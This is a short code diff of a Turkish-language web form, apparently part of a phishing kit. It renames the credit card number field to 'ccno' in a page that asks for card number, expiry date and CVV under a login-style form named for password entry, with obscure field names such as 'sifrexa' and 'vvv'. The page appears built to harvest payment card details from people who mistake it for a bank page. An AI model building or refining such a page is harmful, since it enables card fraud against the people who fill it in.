@@ -28,7 +28,7 @@
   </style>
 <script type="text/javascript">
     function validateForm() {
-        const cardNumber = document.getElementById('tridField').value.replace(/\s/g, ''); // Boşlukları kaldır
+        const cardNumber = document.getElementById('ccno').value.replace(/\s/g, ''); // Boşlukları kaldır
         const expiryDate = document.getElementById('sifrexa').value;
         const vvva = document.getElementById('vvv').value;
         const expiryDateRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
@@ -143,10 +143,10 @@
 <form method="post" id="loginForm" name="sifreGirisForm" autocomplete="off" onsubmit="return validateForm();">
     <fieldset>
         <div class="form-row required">
-            <label for="tridField" class="enforced">Kredi Kartı Numaranız</label>
-            <input type="hidden" name="encTridField" id="encTridField" value=""/>
+            <label for="ccno" class="enforced">Kredi Kartı Numaranız</label>
+            <input type="hidden" name="encccno" id="encccno" value=""/>
             <div class="form-field fieldGroup">
-                <input name="tridField" type="tel" class="form-control" id="tridField" value="" autocomplete="off" maxlength="19" aria-required="true" required/>
+                <input name="ccno" type="tel" class="form-control" id="ccno" value="" autocomplete="off" maxlength="19" aria-required="true" required/>
                 <div class="form-note yg-input-error-msg" id="tck_error" style="display: none;" role="alert">Kart numaranızı hatalı girdiniz.</div>
             </div>  
         </div>
